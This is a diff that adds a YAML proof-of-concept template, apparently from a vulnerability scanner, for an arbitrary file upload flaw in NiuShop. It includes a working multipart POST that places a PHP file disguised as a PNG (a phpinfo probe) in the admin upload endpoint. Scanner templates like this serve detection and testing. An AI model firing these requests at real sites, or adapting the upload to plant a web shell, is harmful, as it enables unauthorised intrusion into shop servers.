@@ -1,0 +1,55 @@
+id: poc-yaml-niushop-arbitrary-file-upload
+info:
+  name: NiuShop 任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: NiuShop
+  osprey-id: vb_2018_0031
+requests:
+- method: GET
+  path: /index.php?s=/admin/upload/uploadfile
+  expression: 'status_code == 200 && contains(body, "文路径不能为空")
+
+    '
+- method: POST
+  path: /index.php?s=/admin/upload/uploadfile
+  headers:
+    Accept: application/json, text/javascript, */*; q=0.01
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBeGAri7DydQdcqWT
+  data: '------WebKitFormBoundaryBeGAri7DydQdcqWT
+
+    Content-Disposition: form-data; name="album_id"
+
+
+    30
+
+    ------WebKitFormBoundaryBeGAri7DydQdcqWT
+
+    Content-Disposition: form-data; name="type"
+
+
+    1,2,3,4
+
+    ------WebKitFormBoundaryBeGAri7DydQdcqWT
+
+    Content-Disposition: form-data; name="file_path"
+
+
+    upload/goods/
+
+    ------WebKitFormBoundaryBeGAri7DydQdcqWT
+
+    Content-Disposition: form-data; name="file_upload"; filename="1.php"
+
+    Content-Type: image/png
+
+
+    <? phpinfo(); ?>
+
+    ------WebKitFormBoundaryBeGAri7DydQdcqWT--'
+  expression: 'status_code == 200 && contains(body, "请检查您的上传参数配置或上传的文件是否有误")
+
+    '
+variables: {}
+transport: http
